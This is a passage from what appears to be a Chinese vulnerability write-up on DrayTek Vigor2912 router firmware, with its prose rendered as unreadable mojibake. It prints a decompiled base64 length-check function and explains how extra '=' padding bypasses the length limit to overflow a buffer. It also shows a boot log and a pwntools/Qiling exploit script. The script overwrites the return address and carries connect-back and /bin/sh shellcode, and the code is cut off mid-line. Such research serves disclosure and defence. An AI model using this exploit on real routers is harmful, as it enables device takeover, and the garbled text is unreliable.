maxlen)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°çœ‹ä¼¼æ˜¯é™åˆ¶äº†æœ€å¤§ decode é•¿åº¦ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªå€¼çœŸçš„ç”Ÿæ•ˆäº†å—ï¼Ÿ æˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-04-29-64de88a39870b052b3e01d824a6f3b83-61799f.png" title="image-20230429164323660" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-04-29-64de88a39870b052b3e01d824a6f3b83-61799f.png" alt="image-20230429164323660"></a></p><p>è¿™é‡Œä¼šæœ‰ä¸€ä¸ª <code>calc_decdoe_len</code>çš„å‡½æ•°ï¼Œæ¥è®¡ç®— base64 decode åçš„é•¿åº¦æ˜¯ä¸æ˜¯å¤§äº maxlen å¦‚æœå¤§äºå°±é€€å‡ºã€‚ é‚£ä¹ˆæˆ‘ä»¬å°±åŸºæœ¬åˆ¤å®šå¤§æ¦‚ç‡é—®é¢˜æ˜¯å‡ºç°åœ¨äº†è¿™ä¸ªå‡½æ•°ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __fastcall <span class="title">calc_decode_len</span><span class="params">(<span class="keyword">char</span> *input_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> inputlen; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> decode_out_len; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> out_len; <span class="comment">// $v1</span></span><br><span class="line">  _BYTE *in_end_chr; <span class="comment">// $a0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> offset; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// $a2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !input_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  inputlen = <span class="built_in">strlen</span>(input_buf);</span><br><span class="line">  decode_out_len = <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !inputlen )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  out_len = decode_out_len - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( input_buf[inputlen - <span class="number">1</span>] != <span class="string">&#x27;=&#x27;</span> )         <span class="comment">// æœ€åä¸€ä½å¦‚æœä¸æ˜¯ = ï¼Œ å°±ç›´æ¥è¿”å›é•¿åº¦</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span> * (inputlen &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  in_end_chr = &amp;input_buf[inputlen];</span><br><span class="line">  offset = decode_out_len - inputlen;</span><br><span class="line">  <span class="keyword">if</span> ( out_len != offset )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = (<span class="keyword">char</span>)*(in_end_chr - <span class="number">2</span>);             <span class="comment">// å¦‚æœå€’æ•°ç¬¬äºŒä½ä¸æ˜¯ = ï¼Œ å°± break ï¼Œ è¿”å› out_len </span></span><br><span class="line">      v8 = out_len - <span class="number">1</span>;</span><br><span class="line">      --in_end_chr;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      --out_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != offset );                     <span class="comment">// --outlen ç›´åˆ°å½“å‰çš„å­—ç¬¦ä¸ä¸º = ï¼Œ æˆ–è€… é•¿åº¦ç­‰äº </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> out_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡é˜…è¯»ä»£ç ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªå‡½æ•°çš„é—®é¢˜æ‰€åœ¨ï¼š</p><p>å¤§è‡´å°±æ˜¯ï¼Œ é¦–å…ˆé€šè¿‡ <code>3 * (inputlen &gt;&gt; 2);</code> è®¡ç®—å‡ºä¸€ä¸ªé•¿åº¦ ï¼Œ ç„¶ååˆ¤æ–­æœ€åä¸€ä½æ˜¯ä¸æ˜¯ = ï¼Œ å¦‚æœä¸æ˜¯ç›´æ¥è¿”å›ï¼Œ å¦‚æœæ˜¯æ¥ç€å¾€ä¸‹èµ°ã€‚ </p><p>ç„¶åæˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸ªå‡æ³•è¿ç®— <code> offset = decode_out_len - inputlen;</code> ï¼Œ æ­£å¸¸è€Œè¨€ï¼Œ è¿™é‡Œçš„ <code>deocde_out_len</code> åº”è¯¥æ˜¯å°äº <code>inputlen</code> çš„æ‰€ä»¥è¿™é‡Œä¼šæ˜¯ä¸€ä¸ª  è´Ÿæ•°ã€‚</p><p>ç„¶åè¿›åˆ° <code>do .. while ()</code> å¾ªç¯ä¸­ï¼Œ åªæœ‰å½“ å½“å‰å­—ç¬¦ä¸ä¸º = æˆ–è€…ï¼Œ <code>v8 == offset</code> çš„æ—¶å€™æ‰ä¼šé€€å‡ºå¾ªç¯ï¼Œ ç”±äº offset æ˜¯ä¸ªè´Ÿæ•°ï¼Œ å› æ­¤åªæœ‰å½“å‰å­—ç¬¦ä¸ä¸º = æ‰ä¼šé€€å‡ºè¿”å›ã€‚ç„¶ä¼šè¿™é‡Œçš„é•¿åº¦å°±ä¼š<code>--out_len</code> é€’å‡ã€‚</p><p>æ ¹æ®base64 çš„åŸç†æˆ‘ä»¬çŸ¥é“å››ä¸ª = ä¸ºç©º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">&quot;====&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› æ­¤åœ¨æ„é€ æˆ‘ä»¬ payload çš„æ—¶å€™ï¼Œ æ¯å¤šäº maxlenï¼ˆè¿™é‡Œæ˜¯ 84 ï¼‰ çš„é•¿åº¦ä¸€ä¸ªå­—ç¬¦ï¼Œ æˆ‘ä»¬å°±éœ€åœ¨åé¢æ·»åŠ   å››ä¸ª ç­‰å·ã€‚ è¿™æ · deocde åçš„é•¿åº¦æ°¸è¿œä¸ä¼šå¤§äº 84ï¼Œ ä½†æ˜¯çœŸæ­£ decode çš„ç»“æœå´ä¼šå¤§äº maxlen</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>æ‹†å¼€æœºå™¨ï¼Œå¯ä»¥å‘ç°å³ä¸‹è§’ 4 ä¸ªpin çš„æ˜¯ è°ƒè¯•å£ ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-28-bb64dffbb21d22a20a84dcf37b1fddd6-4ec5e4.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-28-bb64dffbb21d22a20a84dcf37b1fddd6-4ec5e4.png"></a></p><p>æ¥ç€ä¸²å£åï¼Œ å¯çœ‹åˆ°ä¸€äº›è¾“å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> ~~Hope you find out the clue here~~</span><br><span class="line">Caught reserved exception 11 - should not happen.NMI taken!!!!</span><br><span class="line">@@@die: NMI @@@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vigor2912-DrayLoader-v7 (May  7 2015 - 15:11:57)</span><br><span class="line"></span><br><span class="line">MT6856</span><br><span class="line">DRAM Size: 64 MB</span><br><span class="line">CPU Frequency: 700 MHZ</span><br><span class="line">Flash Manufacture ID: 0xC2, Device ID: 0x20 0x17, Name: MX25L6405D</span><br><span class="line">Flash Size: 8 MB</span><br><span class="line"></span><br><span class="line">Boot DrayOS~~</span><br><span class="line">run_drayos_image: len=5085180</span><br><span class="line">Go~~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> !!! Maxi malloc size =31614752 (st=0X821d88e0, end=0X83fff000)!!!!</span><br><span class="line"></span><br><span class="line"> dynamic_mem_pool=0x821e52b0, size=0xc80fff[12M]!Modes: __STDC__ 32-bit mwDWORD==(unsigned long)</span><br><span class="line">mwROUNDALLOC==4 sizeof(mwData)==24 mwDataSize==24</span><br><span class="line"></span><br><span class="line">statistics: now collecting on a line basis</span><br><span class="line"></span><br><span class="line">============= Memwatch Auto Self Test =============</span><br><span class="line"></span><br><span class="line">Normal Free...DETECTED</span><br><span class="line">Double Free...DETECTED</span><br><span class="line">NULL Free.....DETECTED</span><br><span class="line">Wild Free.....DETECTED</span><br><span class="line">Underflow.....DETECTED</span><br><span class="line">Overflow......DETECTED</span><br><span class="line">Unfree 1......DETECTED</span><br><span class="line">Unfree 2......DETECTED</span><br><span class="line"></span><br><span class="line">ALL TEST OK!</span><br><span class="line">Please be assured that all <span class="built_in">test</span> buffers have freed.</span><br><span class="line">Slab kmalloc range:     [0x821E52B0:0x82E662AF](size=13111295 bytes)</span><br><span class="line">Linear malloc range:    [0x821D88D0:0x83FFF000](size=31614768 bytes)</span><br><span class="line"></span><br><span class="line"> ra_system_init() <span class="keyword">in</span>:&lt;6&gt;ISPRAM0: PA=00b68000,Size=00008000,enabled</span><br><span class="line">&lt;6&gt;CPU revision is: 00019555 (MIPS 34Kc)</span><br><span class="line">Ralink RT63365 SOC prom init</span><br><span class="line"></span><br><span class="line"> prom_init() doneFIXME!!! Do we need to complete specific hardware CPU clock setting? or time_init() would complete it ?</span><br><span class="line">set_except_vector: n=0, addr=8003cb80</span><br><span class="line">set_except_vector: n=0, addr=80027684</span><br><span class="line"></span><br><span class="line"> trap_init() <span class="keyword">done</span></span><br><span class="line"> plat_mem_setup() <span class="keyword">done</span>&lt;6&gt;NR_IRQS:64</span><br><span class="line"></span><br><span class="line"> init_IRQ()...CPU frequency 699.00 MHz</span><br><span class="line">clockevents_register_device</span><br><span class="line">cp0_timer_irq_installed: irq = 31</span><br><span class="line">__setup_irq: irq=31, desc=80a80d30, p=80a80030</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line"></span><br><span class="line"> time_init()...</span><br><span class="line"> skb_init() donePrimary instruction cache 64kB, VIPT, 4-way, linesize 32 bytes.</span><br><span class="line">Primary data cache 32kB, 4-way, VIPT, cache aliases, linesize 32 bytes</span><br><span class="line"></span><br><span class="line"> cache_init() <span class="keyword">done</span></span><br><span class="line"> ralink_led_init() <span class="keyword">done</span>!!!__setup_irq: irq=29, desc=80a80c90, p=821e8fa0</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line">Adapter_Interrupts_Init: Successfully hooked IRQ 29</span><br><span class="line"></span><br><span class="line">Adapter_Interrupts_Init: call back registeredAdapter_EIP93_Init: CmdRing_Handle=82e7232c</span><br><span class="line">Adapter_EIP93_Init: ResRing_Handle=82e72328</span><br><span class="line">Adapter: Successfully initialized EIP93v2 <span class="keyword">in</span> ARM mode</span><br><span class="line">PEC_Init: PRNG is initialized</span><br><span class="line">== IPSEC Crypto Engine Driver : Jul  8 2020 15:25:56 ==</span><br><span class="line"></span><br><span class="line"> hw_crypto_init() <span class="keyword">done</span></span><br><span class="line"> NR_IRQS=64.</span><br><span class="line"> ** Enable Global Int **..end..</span><br><span class="line">flash manufacture id: c2, device id 20 17</span><br><span class="line">MX25L6405D(c2 2017c220) (8192 Kbytes)</span><br><span class="line">../sys_misc.c.584: snprintf <span class="built_in">test</span> pass!</span><br><span class="line">../sys_misc.c.584: vsnprintf <span class="built_in">test</span> pass!</span><br><span class="line">GMAC1_MAC_ADRH -- : 0x0000001d</span><br><span class="line">SMACCR1 -- : 0x0000001d</span><br><span class="line">GMAC1_MAC_ADRL -- : 0xaa93e52c</span><br><span class="line">SMACCR0 -- : 0xaa93e52c</span><br><span class="line">Ralink APSoC Ethernet Driver Initilization. v3.0  256 rx/tx descriptors allocated, mtu = 1500!</span><br><span class="line">Raeth v3.0 (Workqueue)</span><br><span class="line">__setup_irq: irq=22, desc=80a80a60, p=821e8ea0</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line"></span><br><span class="line">phy_tx_ring = 0x021ef000, tx_ring = 0xa21ef000</span><br><span class="line"></span><br><span class="line">phy_rx_ring0 = 0x022c6000, rx_ring0 = 0xa22c6000</span><br><span class="line">Fiber ID does not match (FFFF, FFFF)</span><br><span class="line">Fiber does not exist</span><br><span class="line">GMAC1_MAC_ADRH -- : 0x0000001d</span><br><span class="line">SMACCR1 -- : 0x0000001d</span><br><span class="line">GMAC1_MAC_ADRL -- : 0xaa93e52c</span><br><span class="line">SMACCR0 -- : 0xaa93e52c</span><br><span class="line">__setup_irq: irq=16, desc=80a80880, p=821e8e20</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line">ESW: Link Status Changed - Port2 Link UP</span><br><span class="line">CDMA_CSG_CFG = 81000007</span><br><span class="line">GDMA1_FWD_CFG = C0710000</span><br><span class="line">start PCIe register access</span><br><span class="line"></span><br><span class="line">*************** RT6855A PCIe RC mode *************</span><br><span class="line">PCIE0 no card, <span class="built_in">disable</span> it</span><br><span class="line">PCIE1 no card, <span class="built_in">disable</span> it(RST&amp;CLK)</span><br><span class="line">&lt;4&gt;registering PCI controller with io_map_base <span class="built_in">unset</span></span><br><span class="line"></span><br><span class="line">[SS][Init] Load Service Status from FLASH!!</span><br><span class="line">&lt;6&gt;uVigor2912 by DrayTek Corp.erface driver hub</span><br><span class="line">&lt;6&gt;u==========================ice driver usb</span><br><span class="line">    LAN MAC Address  : 00-1D-AA-93-E5-2C</span><br><span class="line"> usbIP Address       : 192.168.2.1</span><br><span class="line">RT3xIP Subnet Mask   : 255.255.255.0</span><br><span class="line">&lt;6&gt;eFirmware Version : 3.8.12d<span class="string">&#x27; Host Controller (EHCI) Driver</span></span><br><span class="line"><span class="string">__seSystem Up Time   : 0:0:0a80920, p=822ddfa0</span></span><br><span class="line"><span class="string">desc-------- Main Menu ---------&gt;startup=80030078</span></span><br><span class="line"><span class="string">FIXM1 : Enable TFTP Server</span></span><br><span class="line"><span class="string">   Please Select Item : &lt;6&gt;ohci_hcd: USB 1.1 &#x27;</span>Open<span class="string">&#x27; Host Controller (OHCI) Driver</span></span><br><span class="line"><span class="string">VLAN table[2~7] cleaned</span></span><br><span class="line"><span class="string"> usb host init done!!</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver usblp</span></span><br><span class="line"><span class="string">----&gt; usb_net_init()aned</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver LTE device driver</span></span><br><span class="line"><span class="string">&lt;---- usb_net_init()) is 1 **</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ----------------&gt; usb_register&lt;6&gt;usbcore: registered new interface driver usbserial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ----------------&gt; usb_serial_generic_register</span></span><br><span class="line"><span class="string"> ** DrayDown event==0 **</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ** DrayUp event==0 **</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver usbserial_generic</span></span><br><span class="line"><span class="string">Initializing USB Mass Storage driver...</span></span><br><span class="line"><span class="string">                                       &lt;6&gt;usbcore: registered new interface driver usb-storage</span></span><br><span class="line"><span class="string">USB Mass Storage support registered.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &lt;&lt; sys_board_init_later &gt;&gt;</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬é€šè¿‡ PoC æ”»å‡»è®¾å¤‡ä¹‹åï¼Œå¯ä»¥ä»æ—¥å¿—è¾“å‡ºçœ‹åˆ°ä¸€äº› dump ä¿¡æ¯, è¾“å‡ºåŒ…æ‹¬  EPC ï¼Œ å½“å‰å´©æºƒçš„åœ°å€ï¼Œ å¦‚è¿™é‡Œé‡Œæ˜¯ 0xdeadbeafï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-af71d98c211dbd6a59feee082ebe15b6-3fdfed.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-af71d98c211dbd6a59feee082ebe15b6-3fdfed.png"></a></p><p>è¿˜ä¼šæ‰“å°æ ˆ å’Œ å¯„å­˜å™¨</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-92f19cb9d0608f4f58d3e4cd244c72b1-392eaf.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-92f19cb9d0608f4f58d3e4cd244c72b1-392eaf.png"></a></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™äº›è¾“å‡ºæ¥è°ƒæ•´æˆ‘ä»¬çš„ PoC, æ¥è¾¾åˆ°æˆ‘ä»¬ç›®çš„ï¼Œå¦å¤–ä¸ºäº†æ›´æ–¹ä¾¿çš„è°ƒè¯•ï¼Œ æˆ‘è¿˜ä½¿ç”¨äº† qiling è¿›è¡Œéƒ¨åˆ†ä»£ç çš„æ¨¡æ‹Ÿ, æ€è·¯å¦‚ä¸‹ï¼š</p><p>å‰é¢è·‘ä¸€æ®µéšä¾¿çš„ shellcode ï¼Œç„¶åå°† RTOS æ•´ä¸ª binary è¯»èµ·æ¥ï¼Œ å†™å…¥åˆ°æˆ‘ mmap çš„å†…å­˜ä¸­ã€‚ç„¶åè®¾ç½®PC è·³è½¬è¿‡å»ã€‚æœ€åçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.path.append(<span class="string">&quot;..&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_con = asm(shellcraft.connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1337</span>))</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x81B898A0</span></span><br><span class="line">die_func_addr   = <span class="number">0x8007EF90</span> </span><br><span class="line">test_addr = <span class="number">0x8007EF74</span></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> : <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span></span><br><span class="line">pay+= <span class="string">b&#x27;B&#x27;</span>* (<span class="number">0x118</span> - <span class="number">8</span> - <span class="number">8</span>)</span><br><span class="line"><span class="comment"># pay+= p32(0xdeadbeaf) # s0</span></span><br><span class="line">pay+= p32(password_addr) <span class="comment"># s1   </span></span><br><span class="line">pay+= <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">pay+= p32(test_addr) <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line">padding = len(pay) - <span class="number">84</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(pay).decode(<span class="string">&#x27;latin&#x27;</span>) + <span class="string">&#x27;=&#x27;</span> * (padding * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_1</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.log.info(<span class="string">&#x27;now run at: 0x807767A0&#x27;</span>)</span><br><span class="line">    ql.reg.write(<span class="string">&#x27;a0&#x27;</span>, <span class="number">0x21000000</span>)</span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807768B8</span> <span class="comment"># decode username</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_2</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807766ec</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_3</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x80776808</span> </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">MIPS32EL_LIN = unhexlify(<span class="string">&#x27;ffff0628ffffd004ffff05280110e4270ff08424ab0f02240c0101012f62696e2f7368&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    print(<span class="string">&quot;\nVigor 2912 emu&quot;</span>)</span><br><span class="line">    ql = Qiling(code=shellcode, archtype=<span class="string">&quot;mips&quot;</span>, ostype=<span class="string">&quot;linux&quot;</span>, verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;v2912_3812-kernel&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    print(hex(len(data)))</span><br><span class="line">    <span class="comment"># mmap memory</span></span><br><span class="line"></span><br><span class="line">    ql.mem.map(<span class="number">0x20000000</span>, <span class="number">0x3000000</span>, info=<span class="string">&quot;[STACK  ]&quot;</span>)</span><br><span class="line">    ql.mem.map(<span class="number">0x23000000</span>, <span class="number">0x3000000</span>, info=<span class="string">&quot;[SHELLCODE  ]&quot;</span>)</span><br><span class="line">    ql.mem.map(<span class="number">0x80020000</span>, len(data) + <span class="number">4092</span>, info=<span class="string">&quot;[RTOS ]&quot;</span>)</span><br><span class="line">    ql.mem.map(<span class="number">0x82000000</span>, <span class="number">0x4000000</span>)</span><br><span class="line">    ql.mem.show_mapinfo()</span><br><span class="line">    ql.mem.write(<span class="number">0x80020000</span>, data) <span class="comment"># rtos data</span></span><br><span class="line">    ql.mem.write(<span class="number">0x21000000</span>, payload.encode(<span class="string">&#x27;latin&#x27;</span>))</span><br><span class="line">    ql.mem.write(<span class="number">0x23000000</span>, shellcode_con)</span><br><span class="line"></span><br><span class="line">    ql.reg.arch_sp = <span class="number">0x20002000</span> <span class="comment">#sp</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807766EC</span> <span class="comment">#pc</span></span><br><span class="line">    ql.reg.write(<span class="string">&#x27;ra&#x27;</span>, <span class="number">0xdeadbeaf</span>)</span><br><span class="line">    ql.reg.write(<span class="string">&#x27;a0&#x27;</span>, <span class="number">0x21000000</span>)</span><br><span class="line">    ql.hook_address(hook_1, <span class="number">0x807767A0</span>)</span><br><span class="line">    ql.hook_address(hook_2, <span 